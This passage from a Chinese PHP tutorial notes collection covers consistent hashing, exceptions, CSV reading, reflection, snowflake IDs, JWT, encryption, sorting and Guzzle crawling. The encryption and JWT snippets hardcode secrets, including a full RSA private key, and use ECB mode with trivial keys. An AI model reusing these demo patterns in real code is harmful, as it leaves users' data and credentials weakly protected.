$key) &#123; $node = $val; break; &#125; &#125; reset($this-&gt;position); //把数组的内部指针指向第一个元素，便于下次查询从头查找 return $node; &#125; /** * 添加节点 */ public function addNode($node) &#123; if(isset($this-&gt;nodes[$node])) return; // 添加节点和虚拟节点 for ($i = 0; $i &lt; $this-&gt;mul; $i++) &#123; $pos = $this-&gt;hash($node . '-' . $i); $this-&gt;position[$pos] = $node; $this-&gt;nodes[$node][] = $pos; &#125; // 重新排序 $this-&gt;sortPos(); &#125; /** * 删除节点 */ public function delNode($node) &#123; if (!isset($this-&gt;nodes[$node])) return; // 循环删除虚拟节点 foreach ($this-&gt;nodes[$node] as $val) &#123; unset($this-&gt;position[$val]); &#125; // 删除节点 unset($this-&gt;nodes[$node]); &#125; /** * 排序 */ public function sortPos() &#123; ksort($this-&gt;position, SORT_REGULAR); &#125;&#125;// 测试$con = new ConsistentHashing();$con-&gt;addNode('a');$con-&gt;addNode('b');$con-&gt;addNode('c');$con-&gt;addNode('d');$key1 = 'www.zhihu.com';$key2 = 'www.baidu.com';$key3 = 'www.google.com';$key4 = 'www.testabc.com';echo 'key' . $key1 . '落在' . $con-&gt;lookup($key1) . '号节点上！&lt;br&gt;';echo 'key' . $key2 . '落在' . $con-&gt;lookup($key2) . '号节点上！&lt;br&gt;';echo 'key' . $key3 . '落在' . $con-&gt;lookup($key3) . '号节点上！&lt;br&gt;';echo 'key' . $key4 . '落在' . $con-&gt;lookup($key4) . '号节点上！&lt;br&gt;';https://learnku.com/articles/30269 异常处理1234567891011121314151617181920212223242526272829303132333435363738394041424344454647try &#123; $a = 5 % 0;&#125; catch (Exception $e) &#123; echo $e-&gt;getMessage(); $a = -1; // 通过异常来处理 $a 为 0 的情况，但是实际上，捕获不到该异常&#125;echo $a; // 无法执行try &#123; $a = 5 % 0; // 注意，DivisionByZeroError 错误只能捕捉到 % 运算，无法捕捉 / 运算&#125; catch (DivisionByZeroError $e) &#123; echo $e-&gt;getMessage(); $a = -1; &#125;echo $a; // -1异常将错误处理与常规代码进行分离，能够让业务流程更加清晰。try &#123; // 业务流程&#125; catch (FileNotFoundException $e) &#123;&#125; catch (FileTypeException $e) &#123;&#125; catch (Exception $e) &#123;&#125;// 只处理 404 异常public function actionType($username)&#123; try &#123; $user = $client-&gt;get(sprintf("/api/user/%s", $username)); &#125; catch (RequestException $e) &#123; if (404 === $e-&gt;getResponse()-&gt;getStatusCode()) &#123; return "create"; &#125; throw $e; &#125; return "update";&#125;set_exception_handler(function($exception)&#123; echo '发生了未知错误'; log($exception-&gt;getMessage());&#125;);https://learnku.com/articles/37029 秒读 Excel 百万数据123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899class ReaderCsv&#123; /** * 数组键值 * @var int */ protected $row = 0; /** * Excel源数据 * @var array */ protected $excelData = []; /** * 文件路径 * @var */ protected $path; /** * ReaderCsv constructor. * @param $path */ public function __construct($path) &#123; $this-&gt;path = $path; &#125; /** * 读取CSV文件 */ public function readCsv() &#123; //数组键值 $row = $this-&gt;row; //Excel数组 $excelData = []; //打开文件 $file = fopen($this-&gt;path, 'r'); //从文件指针中读入一行并解析 CSV 字段 //fgetcsv 解析读入的行并找出 CSV 格式的字段然后返回一个包含这些字段的数组。 while ($data = fgetcsv($file)) &#123; //统计一行数据有多少列 $columnSize = count($data); for ($i = 0; $i &lt; $columnSize; $i++) &#123; //转换字符的编码 &amp;&amp; 赋值Excel源数据 $excelData[$row][$i] = mb_convert_encoding( $data[$i], 'UTF-8', 'gb2312' ); &#125; $row++; &#125; $this-&gt;row = $row; //关闭一个已打开的文件指针 fclose($file); $this-&gt;excelData = $excelData; &#125; /** * 获取Excel源数据 * @return array */ public function getExcelData() &#123; return $this-&gt;excelData; &#125; /** * 获取总行数 * @return int */ public function getRow() &#123; return $this-&gt;row; &#125;&#125;//传入文件路径$readerCsv = new ReaderCsv($filePath);//读取csv文件$readerCsv-&gt;readCsv();//获取Excel数据$excelData = $readerCsv-&gt;getExcelData();https://learnku.com/articles/37002https://phpspreadsheet.readthedocs.io/en/latest/https://github.com/rap2hpoutre/fast-excelhttps://github.com/viest/php-ext-xlswriter 关键词提取高亮123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566$content = '&lt;p&gt;周杰伦传世之作《晴天》&lt;/p&gt;:从前从前，&lt;div&gt;&lt;img class="img" src="htt://gss0.bdstatic.com/94o3dSag_xI4khGkpoWK1HF6hhy/baike/c0%3Dbaike150%2C5%2C5%2C150%2C50/sign=3137f6103c4e251ff6faecaac6efa272/38dbb6fd5266d0167927ca029b2bd40735fa35d9.jpg"&gt;&lt;/div&gt;有个人&lt;strong&gt;爱你&lt;/strong&gt;很久，&lt;p&gt;风渐渐，把你吹得好远&lt;/p&gt;';echo $content;$tag = [ ['name' =&gt; '周杰伦','url'=&gt;'https://baike.baidu.com/item/%E5%91%A8%E6%9D%B0%E4%BC%A6/129156?fr=aladdin'], ['name'=&gt;'晴天','url'=&gt;'https://baike.baidu.com/item/%E6%99%B4%E5%A4%A9/5429222'], ];preg_match_all('/&lt;a[^&gt;]*&gt;.*?&lt;\/a&gt;|&lt;\/?[a-zA-Z]+[^&gt;]*&gt;|&lt;!--.*?--&gt;/', $content, $match);echo '&lt;pre&gt;';$html = $match[0];$no_html = preg_split('/&lt;a[^&gt;]*&gt;.*?&lt;\/a&gt;|&lt;\/?[a-zA-Z]+[^&gt;]*&gt;|&lt;!--.*?--&gt;/', $content);print_r($html);print_r($no_html);$tags = [[],[],[]];foreach ($tag as $k=&gt;$v)&#123; $tags[0][] = '#'.$v['name'].'#'; $tags[1][] = '#'.md5($v['name']). '#'; $tags[2][] = "&lt;a href=&#123;$v['url']&#125;&gt;&#123;$v['name']&#125;&lt;/a&gt;";&#125;print_r($tags);foreach ($tags[0] as $k=&gt;$v)&#123; foreach ($no_html as $key=&gt;$value)&#123; if (!trim($value)) continue; if(preg_match($v,$value))&#123; $no_html[$key] = preg_replace($v,$tags[1][$k],$value,1); break; &#125; &#125;&#125;print_r($no_html);foreach ($no_html as $key=&gt;$value)&#123; if (!trim($value)) continue; $no_html[$key] = str_replace($tags[1],$tags[2],$value);&#125;$res = [];$num = count($no_html);print_r($no_html);for ($i=0;$i&lt;$num;$i++)&#123; $res[] = $no_html[$i]; if (isset($html[$i]))&#123; $res[]=$html[$i]; &#125;&#125;echo implode('',$res);&lt;p&gt;&lt;a href=https://baike.baidu.com/item/%E5%91%A8%E6%9D%B0%E4%BC%A6/129156?fr=aladdin&gt;周杰伦&lt;/a&gt;传世之作《&lt;a href=https://baike.baidu.com/item/%E6%99%B4%E5%A4%A9/5429222&gt;晴天&lt;/a&gt;》&lt;/p&gt;:从前从前，&lt;div&gt;&lt;img class="img" src="htt://gss0.bdstatic.com/94o3dSag_xI4khGkpoWK1HF6hhy/baike/c0%3Dbaike150%2C5%2C5%2C150%2C50/sign=3137f6103c4e251ff6faecaac6efa272/38dbb6fd5266d0167927ca029b2bd40735fa35d9.jpg"&gt;&lt;/div&gt;有个人&lt;strong&gt;爱你&lt;/strong&gt;很久，&lt;p&gt;风渐渐，把你吹得好远&lt;/p&gt;/** * 对字符串执行指定次数替换 * @param Mixed $search 查找目标值 * @param Mixed $replace 替换值 * @param Mixed $subject 执行替换的字符串／数组 * @param Int $limit 允许替换的次数，默认为-1，不限次数 * @return Mixed */ function str_replace_limit($search, $replace, $subject, $limit=-1)&#123; if(is_array($search))&#123; foreach($search as $k=&gt;$v)&#123; $search[$k] = '`'. preg_quote($search[$k], '`'). '`'; &#125; &#125;else&#123; $search = '`'. preg_quote($search, '`'). '`'; &#125; return preg_replace($search, $replace, $subject, $limit); &#125; PHP 反射12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152ReflectionClassReflectionFunctionReflectionMethodReflectionParameterclass Printer&#123;&#125;class Student&#123; private $name; private $year; public function __construct($name, $year) &#123; $this-&gt;name = $name; $this-&gt;year = $year; &#125; public function getValue() &#123; return $this-&gt;name; &#125; public function setBase(Printer $printer, $name, $year = 10) &#123; $this-&gt;name = $name; $this-&gt;year = $year; &#125;&#125;$refl_class = new ReflectionClass(Student::class);$object = $refl_class-&gt;newInstanceArgs(["obama", 100]);echo get_class($object) . "\n";"Student"echo $object-&gt;getValue();obama$refl_method = $refl_class-&gt;getMethod("setBase");echo get_class($refl_method) . "\n";$parameters = $refl_method-&gt;getParameters();foreach ($parameters as $parameter) &#123; echo $parameter-&gt;getName() . "\n"; if ($parameter-&gt;getClass() != null) &#123; echo $parameter-&gt;getClass()-&gt;getName() . "\n"; &#125; if ($parameter-&gt;isDefaultValueAvailable()) &#123; echo $parameter-&gt;getDefaultValue() . "\n"; &#125;&#125;printerPrinternameyear10https://learnku.com/articles/37162 经度和纬度计算距离两地距离12345678910111213function getDistance($lng1, $lat1, $lng2, $lat2)&#123; // 将角度转为狐度https://www.qqdeveloper.com/2019/09/26/longitude-and-langitude/ //deg2rad()函数将角度转换为弧度 $radLat1 = deg2rad($lat1); $radLat2 = deg2rad($lat2); $radLng1 = deg2rad($lng1); $radLng2 = deg2rad($lng2); $a = $radLat1 - $radLat2; $b = $radLng1 - $radLng2; $s = 2 * asin(sqrt(pow(sin($a / 2), 2) + cos($radLat1) * cos($radLat2) * pow(sin($b / 2), 2))) * 6378.137 * 1000; return $s;&#125; 雪花算法12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152531bit:一般是符号位，不做处理41bit:用来记录时间戳，这里可以记录 69 年，如果设置好起始时间比如今年是 2018 年，那么可以用到 2089 年，到时候怎么办？要是这个系统能用 69 年，我相信这个系统早都重构了好多次了。10bit:10bit 用来记录机器 ID，总共可以记录 1024 台机器，一般用前 5 位代表数据中心，后面 5 位是某个数据中心的机器 ID12bit:循环位，用来对同一个毫秒之内产生不同的 ID，12 位可以最多记录 4095 个，也就是在同一个机器同一毫秒最多记录 4095 个，多余的需要进行等待下毫秒。上面只是一个将 64bit 划分的标准，当然也不一定这么做，可以根据不同业务的具体场景来划分，比如下面给出一个业务场景：服务目前 QPS10 万，预计几年之内会发展到百万。当前机器三地部署，上海，北京，深圳都有。当前机器 10 台左右，预计未来会增加至百台。适用场景:当我们需要无序不能被猜测的 ID，并且需要一定高性能，且需要 long 型，那么就可以使用我们雪花算法。比如常见的订单 ID，用雪花算法别人就无法猜测你每天的订单量是多少。PHP uniqid()函数可用于生成不重复的唯一标识符，该函数基于微秒级当前时间戳。在高并发或者间隔时长极短（如循环代码）的情况下，会出现大量重复数据。即使使用了第二个参数，也会重复，最好的方案是结合 md5 函数来生成唯一 ID。$units = array();for($i=0;$i&lt;1000000;$i++)&#123; $units[] = uniqid();&#125;$values = array_count_values($units);$duplicates = [];foreach($values as $k=&gt;$v)&#123; if($v&gt;1)&#123; $duplicates[$k]=$v; &#125;&#125;echo '&lt;pre&gt;';print_r($duplicates);$units = array();for($i=0;$i&lt;1000000;$i++)&#123; $units[] = uniqid('',true);&#125;$values = array_count_values($units);$duplicates = [];foreach($values as $k=&gt;$v)&#123; if($v&gt;1)&#123; $duplicates[$k]=$v; &#125;&#125;echo '&lt;pre&gt;';print_r($duplicates);$units = array();for($i=0;$i&lt;1000000;$i++)&#123; $units[]=md5(uniqid(md5(microtime(true)),true));&#125;$values = array_count_values($units);$duplicates = [];foreach($values as $k=&gt;$v)&#123; if($v&gt;1)&#123; $duplicates[$k]=$v; &#125;&#125;echo '&lt;pre&gt;';print_r($duplicates);使用 session_create_id()函数生成唯一标识符，经过实际测试发现，即使循环调用 session_create_id()一亿次，都没有出现过重复。php session_create_id()是 php 7.1 新增的函数，用来生成 session id，低版本无法使用。https://www.qqdeveloper.com/2019/09/12/snowflake/https://www.qqdeveloper.com/2019/09/16/php-unique-id/ 跨域认证解决方案jwt12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061(图一)Session与Cookie认证与鉴权1.客户端向服务端发送一个http请求。2.服务端在收到客户端的请求时，生成一个唯一的 sessionid，这里需要将该生成的 session 存储在服务端,这个 sessionid 存储具体的 session 内容，默认的是文件存储，当然我们可以修改具体的存储方式，例如数据库存储。 3.客户端在接受到这个 sessionid 时，存在 cookie 里面，每次请求时携带该 sessionid。 4.服务端在接收到客户端的请求之后，根据客户端发送的 sessionid 来进行认证与授权。这里也推荐一下自己之前分享的一篇有关 session 于 cookie 的知识点。session 与 cookie 详解(图二)传统的token授权1.客户端向服务端发送一个http请求。2.服务端在收到客户端的请求之后，生成一个唯一 token，这里需要将该生成的 token 存储在服务端，至于怎么存，可以和上面 session 与 cookie 的方式一致。也可以存在缓存数据库中，如 redis，memcached。 3.服务端将该 token 返回给客户端，客户端存在本地，可以存请求头 header 中，也可以存在 cookie 中，同时也可以存在 localstorage 中。 4.向服务端发送请求时，携带该 token，服务端进行认证或者授权。(图三)JWT认证模式1.客户端向服务端发送一个http请求。2.服务端根据 jwt 的生成规则，生成一个 token，并返回给客户端，这里服务端是不需要存储的。 3.客户端在接受到该 token 时，存在客户端。 4.客户端向服务端发送请求时，服务端对请求的 token 进行解析，如果发现解析出来的数据和生成的数据是一致的代表是一个合法的 token，则进行相应的操作。基于 session 都是需要服务端存储的，而 JWT 是不需要服务端来存储的。针对以上几点，总结如下：一、缺点 1.容易遇到跨域问题。不同域名下是无法通过 session 直接来做到认证和鉴权的。 2.分布式部署的系统，需要使用共享 session 机制 3.容易出现 csrf 问题。二、优点 1.方便灵活，服务器端直接创建一个 sessionid，下发给客户端，客户端请求携带 sessionid 即可。2.session 存储在服务端，更加安全。 3.便于服务端清除 session，让用户重新授权一次。JWT 是基于客户端存储的一种认证方式，然而 session 是基于服务端存储的一种认证方式。JWT 虽然不用服务端存储了，也可以避免跨域、csrf 等情况。但也存在如下几个不太好的地方。 1.无法清除认证 token。由于 JWT 生成的 token 都是存储在客户端的，不能有服务端去主动清除，只有直到失效时间到了才能清除。除非服务端的逻辑做了改变。 2.存储在客户端，相对服务端，安全性更低一些。当 JWT 生成的 token 被破解，我们不便于清除该 token。composer require firebase/php-jwtprivate $key = 'jwtKey'; // 生成JWT public function createJwt() &#123; $time = time(); $key = $this-&gt;key; $token = [ 'iss' =&gt; 'https://www.qqdeveloper.com',// 签发人 'exp' =&gt; $time + 86400,// 过期时间(这里的有效期时间为1天) 'sub' =&gt; '主题内容',// 主题 'aud' =&gt; '受众内容',// 受众 'nbf' =&gt; $time,// 生效时间 'iat' =&gt; $time,// 签发时间 'jti' =&gt; 123,// 编号 // 额外自定义的数据 'data' =&gt; [ 'userName' =&gt; '编程浪子走四方' ]]; // 调用生成加密方法('Payloadn内容','加密的键',['加密算法'],['加密的可以'],['JWT的header头']) $jwt = JWT::encode($token, $key); return json(['data' =&gt; $jwt]); &#125; // 解析JWT public function analysisJwt() &#123; try &#123; $key = $this-&gt;key; $jwt = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9leGFtcGxlLm9yZyIsImV4cCI6MTU2ODA5NjE4MCwic3ViIjoiXHU0ZTNiXHU5ODk4XHU1MTg1XHU1YmI5IiwiYXVkIjoiXHU1M2Q3XHU0ZjE3XHU1MTg1XHU1YmI5IiwibmJmIjoxNTY4MDA5NzgwLCJpYXQiOjE1NjgwMDk3ODAsImp0aSI6MTIzLCJkYXRhIjp7InVzZXJOYW1lIjoiXHU3ZjE2XHU3YTBiXHU2ZDZhXHU1YjUwXHU4ZDcwXHU1NmRiXHU2NWI5In19.kHb_9Np0zjE25YE9czUEGvmFPYtqMJT9tuZzJTuMZl0'; // 调用解密方法('JWT内容','解密的键,和加密时的加密键一直','加密算法') $decoded = JWT::decode($jwt, $key, array('HS256')); return json(['message' =&gt; $decoded]); &#125; catch (\Exception $exception) &#123; return json(['message' =&gt; $exception-&gt;getMessage()]); &#125; &#125;&#125;https://www.qqdeveloper.com/2019/09/09/Jwt/ 加密算法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101MD5 结果是 128 位摘要，SHa1 是 160 位摘要。那么 MD5 的速度更快，而 SHA1 的强度更高。常用的对称加密算法有：AES 和 DES。DES：比较老的算法，一共有三个参数入口（原文，密钥，加密模式）。而 3DES 只是 DES 的一种模式，是以 DES 为基础更安全的变形，对数据进行了三次加密，也是被指定为 AES 的过渡算法。AES:高级加密标准，新一代标准，加密速度更快，安全性更高（不用说优先选择）$content = "123456";// 该函数是获取有哪些加密方式$encryptMethod = openssl_get_cipher_methods();$method1 = "AES-256-ECB";$key = "123";$encrypt2 = openssl_encrypt($content,$method1,$key);echo $encrypt2."\n";$decrypt2 = openssl_decrypt($encrypt2,$method1,$key);echo $decrypt2."\n";$method2 = "DES-EDE3-CFB";$encrypt3 = openssl_encrypt($content,$method2,$key);echo $encrypt3."\n";$decrypt3 = openssl_decrypt($encrypt3,$method2,$key);echo $decrypt3."\n";公开密钥（publickey:简称公钥）和私有密钥（privatekey:简称私钥）。公钥与私钥是一对，如果用公钥对数据进行加密，只有用对应的私钥才能解密。因为加密和解密使用的是两个不同的密钥，所以这种算法叫作非对称加密算法。非对称密码体制的特点：算法强度复杂、安全性依赖于算法与密钥但是由于其算法复杂，而使得加密解密速度没有对称加密解密的速度快。对称密码体制中只有一种密钥，并且是非公开的，如果要解密就得让对方知道密钥。所以保证其安全性就是保证密钥的安全，而非对称密钥体制有两种密钥，其中一个是公开的，这样就可以不需要像对称密码那样传输对方的密钥了。这样安全性就大了很多。1.A 要向 B 发送信息，A 和 B 都要产生一对用于加密的公钥和私钥。2.A 的私钥保密，A 的公钥告诉 B；B 的私钥保密，B 的公钥告诉 A。3.A 要给 B 发送信息时，A 用 B 的公钥加密信息，因为 A 知道 B 的公钥。4.A 将这个消息发给 B（已经用 B 的公钥加密消息）。5.B 收到这个消息后，B 用自己的私钥解密 A 的消息。其他所有收到这个报文的人都无法解密，因为只有 B 才有 B 的私钥。// 公钥内容$publicKey = "-----BEGIN PUBLIC KEY-----MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA448HrtB/ORfECv/owcABfN/PfAy2G7BGPkIy96QuFQhgf7pTF+X4x4wRZgRtdmhnMgtpessx6UXaNzRaDsa8IWozFTrNu3P7xcJxdcWbdlHdMYASmp4xOe6ct/tGURI8HBn4yjxTES4IFAoPxNCtdgs31dsJnq0uUa3C1VTWbPtdZX+GX/GOsl2hbJOhn/WrRlOIGzI2oSjhdaPXGD1wxXKCZM1RhcjQoWQLnFerlOeqNRhW+qgoJ7nRD+PhEajA0LhUMHvyeFR+A37DuFdIKBD58b2EnBZmYyZL7umeNjjhruSyeD1Y5qOvuKOoL7vQOVzAdVwokcMqDmXurR4skQIDAQAB-----END PUBLIC KEY-----";// 私钥内容$privateKey = "-----BEGIN PRIVATE KEY-----MIIEvwIBADANBgkqhkiG9w0BAQEFAASCBKkwggSlAgEAAoIBAQDjjweu0H85F8QK/+jBwAF83898DLYbsEY+QjL3pC4VCGB/ulMX5fjHjBFmBG12aGcyC2l6yzHpRdo3NFoOxrwhajMVOs27c/vFwnF1xZt2Ud0xgBKanjE57py3+0ZREjwcGfjKPFMRLggUCg/E0K12CzfV2wmerS5RrcLVVNZs+11lf4Zf8Y6yXaFsk6Gf9atGU4gbMjahKOF1o9cYPXDFcoJkzVGFyNChZAucV6uU56o1GFb6qCgnudEP4+ERqMDQuFQwe/J4VH4DfsO4V0goEPnxvYScFmZjJkvu6Z42OOGu5LJ4PVjmo6+4o6gvu9A5XMB1XCiRwyoOZe6tHiyRAgMBAAECggEBALtXC1ouKC8Wk70ChdrMee0WTLixtlMBQjMLSO57abzDEr7U5IeuOqv9cm1sg7mRpjObFZGUK1kCuu3r2aCEmGliBwAZUzpZ+BMNS19L+frk1pdj+uz0A07QVJFa+r7PplD0SNAl7bUdEmV9CxJbQhMGlUcodrj9lj6EMPx0RbudgBLJbZCK+h8lNgbGYce+J0+CDDnTapsPKFP/DvwZwgE4CkpVciEtbH2RzU45qRVIIf7/3YBB3q+eD4GrIuBgmLUT7bs2vKn/RXxN8YARoEwUqj/Gg2iXQeSPtW0iWuV/cbCT6Sfb1J7KGXiEDKrsNH+e29TcXsIDbrMHSyj3IeECgYEA8gtQJbHDhcXjDSx15SWKpWdhFNEp/ggdFj8hAroVBHPmGelvkY6i4OZ/IGulzIrJY2uxXwU91KMuoZ5/IdOQSZiehsba1PCn9ZAVY/KZZvfAYX96tUKUmnar1GyhhcSAljPK2zKqYbGnJbnITVMpSthdNgEi/XNrEWrpXFWimI0CgYEA8K3nhWBt4xG87x9ifEpJjFlf/8hlmKr98SMi4qm/ja3huL4si1VVkO8flqqhkkr+HqtBKOe+bYMZBUDtYnv/netMeQuCdvJYsfXPeSguXgGhjxP6gNswMYnzOykoGyPT84gOXBuY2M8X9nB6SkAQ+OL/sf0ltQdP4mdQNQBKjRUCgYEA5sLmbKmoMZfSurKSzB8Yqk1/fytTj8AIizcwr7rdYttkm3u1RN7qZuUaerxm3DXNfx4jguYqZtoVET1dE9DylVgOe4yHAdFXMIVn/1xB6Kt4HPw+7yVFLGbLt8DB1hjcR1elpYoOawnGw+72CtKoYZUaeOxogZ9Sis6VIdT7KdkCgYEAtkmw0fcwI0xbAe2OZT7Kp89Fg3BfapsPzORk1rHkkEVDce4vxLQ0I5rJHQ9NYoUEJWxl5LppI36oo68CXJY4C36cpA1QmhCBlv/rTQNe4vpvR/PExnW88bhfDc7lPnELZicFYUPRp1xq9M9KABS4Bhm/uipWtd685WiEejAnRuUCgYA4ddYkl6XwA/HQ1KyriwAllDdusuGW62DMeXC2h2qw8yCvG38YAQu8lRDCFm0JW/sD2sgVCtt9c147ZFoBmUghpFOZRZvbxEdPzIyb4Gn0wN+3Jwjrl9uPiY82q92G0E253PKug2EJYapa411/fxrEXMi/X+VwggoEnOqXsbyrHA==-----END PRIVATE KEY-----";// 加密字符串$content = "123456";/** * 使用公钥加密，私钥解密 */$encrypt = "";openssl_public_encrypt($content,$encrypt,$publicKey);echo "加密之后的数据为:\n";var_dump($encrypt);$decrypt = "";openssl_private_decrypt($encrypt,$decrypt,$privateKey);echo "解密之后的数据为:\n";var_dump($decrypt);/** * 使用私钥加密，公钥解密 */$encrypt1 = "";openssl_private_encrypt($content,$encrypt1,$privateKey);echo "加密之后的数据为:\n";var_dump($encrypt1);$decrypt1 = "";openssl_public_decrypt($encrypt1,$decrypt1,$publicKey);echo "解密之后的数据为:\n";var_dump($decrypt1);https://www.qqdeveloper.com/2019/08/28/data-encrypt/ 常用排序算法之桶排序123456789101112131415161718192021222324252627282930313233343536373839404142桶排序其实就是一种归纳排序，他将要进行排序的数组分到有限的桶里面，然后对桶进行归纳排序，可以理解成他是一个归纳结果。小哼的班上只有 5 个同学，这 5 个同学分别考了 5 分、3 分、 5 分、2 分和 8 分，哎考得真是惨不忍睹（满分是 10分）。接下来将分数进行从小到大排序， 排序后是 2 3 5 5 8。思路分析 首先，他的总分是 10 分，也就是说有 11 种情况，所以我们需要 11 个桶，开始的时候我们都不给这些桶加水，也就是每个桶是 0，每个桶都标号从 0 开始到 10 结束。 然后呢我们可以看到有 5 个同学，所以，我们可以通过循环拿到这五个同学的分数，拿到分数后，比如我先拿到的是 8 分，那么我们就给标号为 8 的桶加 1 刻度水（当然也不一定是刻度为单位，也可以是升，毫升什么的，这里是方便理解），这样下来，标号为 2 的桶里有 1 刻度水，标号为 3 的桶里有 1 刻度水，标号为 5 的桶里有 2 刻度水，标号为 8 的桶里有 1 刻度水。 最后，我们对这些桶里面的水进行统计，从前往后，有一刻度水的就打印这个桶编号 1 次，两刻度水的就打印桶编号 2 次 public function index() &#123; //需要进行排序的数组 $arr = array(5, 3, 5, 2, 8); //声明一个空数组 $list = array(); //将空数组赋值0 for ($i = 0; $i &lt;= 10; $i++) &#123; $list[$i] = 0; &#125; //按照相应的进行重新赋值 for ($j = 0; $j &lt; sizeof($arr); $j++) &#123; $list[$arr[$j]]++; &#125; //打印排序后的结果 for ($i = 1; $i &lt;= 10; $i++) &#123; for ($j = 1; $j &lt;= $list[$i]; $j++) &#123; var_dump($i); &#125; &#125; &#125;https://learnku.com/articles/37185$data = [5,3,5,2,8];$count = array_count_values($data);$res = [];for ($i = 0; $i &lt; 11; $i++) &#123; if (isset($count[$i])) &#123; for ($j = 0; $j &lt; $count[$i]; $j++) &#123; $res[] = $i; &#125; &#125;&#125; PHP 爬虫爬取社区文章12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061Goutte composer require fabpot/goutteGuzzle composer require guzzlehttp/guzzle:~6.0php artisan make:command Spidernamespace App\Console\Commands;use Goutte\Client as GoutteClient;use GuzzleHttp\Client as GuzzleClient;use GuzzleHttp\Pool;use Illuminate\Console\Command;use Illuminate\Support\Facades\Storage;class Spider extends Command&#123; protected $signature = 'command:spider &#123;concurrency&#125; &#123;keyWords*&#125;'; //concurrency为并发数 keyWords为查询关键词 protected $description = 'php spider'; public function __construct() &#123; parent::__construct(); &#125; public function handle() &#123; // $concurrency = $this-&gt;argument('concurrency'); //并发数 $keyWords = $this-&gt;argument('keyWords'); //查询关键词 $guzzleClent = new GuzzleClient(); $client = new GoutteClient(); $client-&gt;setClient($guzzleClent); $request = function ($total) use ($client,$keyWords)&#123; foreach ($keyWords as $key)&#123; $url='https://laravel-china.org/search?q='.$key; yield function () use($client,$url)&#123; return $client-&gt;request('GET',$url); &#125;; &#125; &#125;; $pool = new Pool($guzzleClent,$request(count($keyWords)),[ 'concurrency' =&gt; $concurrency, 'fulfilled' =&gt; function ($response, $index) use ($client)&#123; $response-&gt;filter('h2 &gt; a')-&gt;reduce(function($node) use ($client)&#123; if(strlen($node-&gt;attr('title'))==0) &#123; $title = $node-&gt;text(); //文章标题 $link = $node-&gt;attr('href'); //文章链接 $carwler = $client-&gt;request('GET',$link); //进入文章 $content=$carwler-&gt;filter('#emojify')-&gt;first()-&gt;text(); //获取内容 Storage::disk('local')-&gt;put($title,$content); //储存在本地 &#125; &#125;); &#125;, 'rejected' =&gt; function ($reason, $index)&#123; $this-&gt;error("Error is ".$reason); &#125; ]); //开始爬取 $promise = $pool-&gt;promise(); $promise-&gt;wait(); &#125;&#125;https://learnku.com/articles/6272/php-crawler-crawls-community-article-content guzzle使用cookies实现模拟登录1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586$client = new \GuzzleHttp\Client(['cookies' =&gt; true]);$r = $client-&gt;request('GET', 'http://httpbin.org/cookies');namespace App\Http\Controllers;use GuzzleHttp\Client;class TestController extends Controller&#123; public function test() &#123; $client = new Client(['cookies' =&gt; true]); // 登录账号https://phpartisan.cn/news/47.html $login = $client-&gt;request('POST','登录地址',['form_params' =&gt; ['usename' =&gt; '账号','password'=&gt;'密码','remember'=&gt;'false']]); // 请求需要登录才能访问的页面 $response = $client-&gt;request('GET',""); $data = $response-&gt;getBody(); echo $data; &#125;&#125;$response = $client-&gt;request('POST', 'http://httpbin.org/post', [ 'multipart' =&gt; [ [ 'name' =&gt; 'field_name', 'contents' =&gt; 'abc' ], [ 'name' =&gt; 'file_name', 'contents' =&gt; fopen('/path/to/file', 'r') ], [ 'name' =&gt; 'other_file', 'contents' =&gt; 'hello', 'filename' =&gt; 'filename.txt', 'headers' =&gt; [ 'X-Foo' =&gt; 'this is an extra header to include' ] ] ]]);$response = $client-&gt;request('POST', 'http://httpbin.org/post', [ 'form_params' =&gt; [ 'field_name' =&gt; 'abc', 'other_field' =&gt; '123', 'nested_field' =&gt; [ 'nested' =&gt; 'hello' ] ]]);$response = $client-&gt;request('POST', 'https://credit.baiqishi.com/clweb/api/common/gettoken', ['json' =&gt; ['token'=&gt;'']]);发送并发请求Guzzle你可以使用Promise和异步请求来同时发送多个请求：$client = new Client();// 创建一个请求列表$promises = [ 'baidu' =&gt; $client-&gt;getAsync('https://www.baidu.com/'), 'jd' =&gt; $client-&gt;getAsync('http://www.jd.com/'), 'earnp' =&gt; $client-&gt;getAsync('http://bbs.earnp.com/'),];// 等待所有请求完成$results = Promise\unwrap($promises);// 查看请求结果$baidu = $results['baidu']-&gt;getHeader('Content-Length');$jd = $results['jd']-&gt;getHeader('Content-Length');$earnp = $results['earnp']-&gt;getHeader('Content-Length');dd($jd);上面确定了并发的数量，当你想发送不确定数量的请求时，可以使用GuzzleHttp\Pool对象：$client = new Client();$requests = function ($total) &#123; $uri = 'http://baidu.com'; for ($i = 0; $i &lt; $total; $i++) &#123; yield new Request('GET', $uri); &#125;&#125;;$pool = new Pool($client, $requests(100), [ 'concurrency' =&gt; 5, 'fulfilled' =&gt; function ($response, $index) &#123; // 成功的响应。 &#125;, 'rejected' =&gt; function ($reason, $index) &#123; // 失败的响应 &#125;,]);// 构建请求https://phpartisan.cn/news/44.html$promise = $pool-&gt;promise();// 等待请求池完成。$promise-&gt;wait(); 3DES加密1234567891011121314151617181920212223242526272829303132php7.1开始不再支持mcrypt_encrypt，所有这里会有2个版本的3DES加密并且对接JAVA,具体实施如下：php版本小于php7.0使用mcrypt方法即可进行加密解密。$size = mcrypt_get_block_size('des', 'ecb');$td = mcrypt_module_open(MCRYPT_3DES, '', 'ecb', '');$iv = @mcrypt_create_iv(mcrypt_enc_get_iv_size($td), MCRYPT_RAND);// 使用MCRYPT_3DES算法,cbc模式@mcrypt_generic_init($td, $key, $iv);// 初始处理$data = mcrypt_generic($td, $input);// 加密var_dump($data);$decrypted = mdecrypt_generic($td, $data); // 解密var_dump($decrypted);mcrypt_generic_deinit($td);// 结束mcrypt_module_close($td);php版本大于php7.0大于7.0版本我们开始使用openssl进行加密解密处理了：# 加密$data = 